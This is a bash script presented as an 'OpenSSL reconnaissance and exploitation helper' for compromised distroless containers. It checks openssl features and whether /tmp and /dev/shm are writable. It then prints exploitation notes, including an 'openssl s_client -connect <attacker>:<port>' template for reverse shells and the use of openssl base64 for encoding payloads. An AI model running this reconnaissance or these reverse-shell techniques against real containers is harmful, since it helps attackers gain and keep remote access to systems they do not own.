#!/bin/bash
# OpenSSL reconnaissance and exploitation helper
# Usage: Run this inside a distroless container with openssl

echo "=== OpenSSL Reconnaissance ==="
echo ""

# Check openssl version
if command -v openssl &> /dev/null; then
    echo "OpenSSL found!"
    echo "Version: $(openssl version)"
    echo ""
    
    # Check available commands
    echo "Available openssl commands:"
    openssl list -command 2>/dev/null || openssl help 2>/dev/null | head -30
    echo ""
    
    # Check if we can use s_client
    echo "Testing s_client capability..."
    echo "s_client is available for reverse shell attempts"
    echo ""
    
    # Check for certificate-related capabilities
    echo "Certificate capabilities:"
    openssl version -a 2>/dev/null | grep -E '(OpenSSL|libssl|libcrypto)'
    echo ""
    
    # Check for random number generation
    echo "Random number generation:"
    openssl rand -hex 16 2>/dev/null && echo "[+] Random generation works"
    echo ""
    
    # Check for base64 encoding/decoding
    echo "Base64 capabilities:"
    echo "test" | openssl base64 2>/dev/null && echo "[+] Base64 encoding works"
    echo "dGVzdA==" | openssl base64 -d 2>/dev/null && echo "[+] Base64 decoding works"
    echo ""
    
    # Check for file operations
    echo "File operation capabilities:"
    if [ -w /tmp ]; then
        echo "[+] /tmp is writable"
    else
        echo "[-] /tmp is not writable"
    fi
    
    if [ -w /dev/shm ]; then
        echo "[+] /dev/shm is writable"
    else
        echo "[-] /dev/shm is not writable"
    fi
    
    echo ""
    echo "=== Exploitation Notes ==="
    echo "1. Use 'openssl s_client -connect <attacker>:<port>' for reverse shells"
    echo "2. Use 'openssl base64' for encoding/decoding payloads"
    echo "3. Use 'openssl rand' for generating random data"
    echo "4. Check Form3 blog for advanced techniques: https://www.form3.tech/engineering/content/exploiting-distroless-images"
else
    echo "[-] OpenSSL not found in this container"
fi
